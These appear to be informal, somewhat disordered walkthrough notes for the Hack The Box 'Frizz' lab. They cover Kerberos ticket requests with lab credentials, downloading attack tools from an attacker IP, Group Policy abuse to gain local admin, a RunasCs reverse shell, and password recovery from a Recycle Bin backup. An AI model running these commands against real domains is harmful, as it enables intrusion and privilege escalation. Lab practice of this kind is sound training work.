Used impacket-getTGT to retrieve a ticket-granting ticket (TGT) for the user
M.SchoolBus .
impacket-getTGT frizz.htb/M.schoolbus:'!suBcig@MehTed!R' -dc-ip frizzdc.fri
zz.htb

export KRB5CCNAME=M.schoolbus.ccache


mpacket-getTGT frizz.htb/f.frizzle:Jenni_Luvs_Magic23 -dc-ip frizzdc.frizz.htb  
export KRB5CCNAME=f.frizzle.ccache  
  
use ssh to login in:  
ssh f.frizzle@frizz.htb -K  
(repeat this to make it happen if the connection get refused.)  
  
Get the user flag in PS C:\Users\f.frizzle\Desktop> type user.txt  
159ec376de1009f9f3fb1eda8xxxxxxx

Privilege Escalation.  
mk a temporary directory "mkdir C:\tmp"  
start a simplehttpserver and upload the tool.  
  
Uploading tool:  
Invoke-WebRequest -Uri "http://10.10.14.XX/SharpGPOAbuse.exe" -OutFile "C:\tmp\SharpGPOAbuse.exe"  
Abusing GPO for Admin:  
  
New-GPO -Name "pwnedGPO"  
New-GPLink -Name "pwnedGPO" -Target "OU=Domain Controllers,DC=frizz,DC=htb"  


New-GPLink -Name "evil" -Target "OU=Domain Controllers,DC=frizz,DC=htb"


.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName pwnedGPO  
Forcing update:  
 gpupdate /force  
  
Using RunasCs to get Admin shell:  
Invoke-WebRequest -Uri "http://10.10.14.XX/RunasCs.exe" -OutFile  
"C:\tmp\RunasCs.exe"  
./RunasCs.exe 'M.schoolbus' '<password>' powershell.exe -r <nc_IP>:<nc_Port>  
  
start a reverse shell on your machine {repeat until u get a shell}.  
  
Capturing Flags  
User Flag  
type C:\Users\f.frizzle\Desktop\user.txt  
Output:  
159ec376de1009f9f3fb1eda8xxxxxxx  
Root Flag  
type C:\Users\Administrator\Desktop\root.txt  
Output:  
eb512c2a692be19c950cc5234xxxxxxx



  
Gaining Root Access.  
Extracting Data from Recycle Bin  
$shell = New-Object -ComObject Shell.Application  
$recycleBin = $shell.Namespace(0xA)  
$recycleBin.items() | Select-Object Name, Path  
Found a backup file:  
wapt-backup-sunday.7z -> C:\$RECYCLE.BIN\S-1-5-21-XXXXX\backup.7z  
  
restore the file  
$recycleBin = (New-Object -ComObject Shell.Application).NameSpace(0xA)  
$items = $recycleBin.Items()  
$item = $items | Where-Object {$_.Name -eq "wapt-backup-sunday.7z"}  
$documentsPath = [Environment]::GetFolderPath("MyDocuments")  
$documents = (New-Object -ComObject Shell.Application).NameSpace($documentsPath)  
$documents.MoveHere($item)  
  
Extracting credentials from waptserver.ini file:  
M.schoolbus -> Password: !suBcig@MehTed!R  
Final Access for Root Privileges  
export KRB5CCNAME=M.schoolbus.ccache  
  
ssh M.schoolbus@frizz.htb -K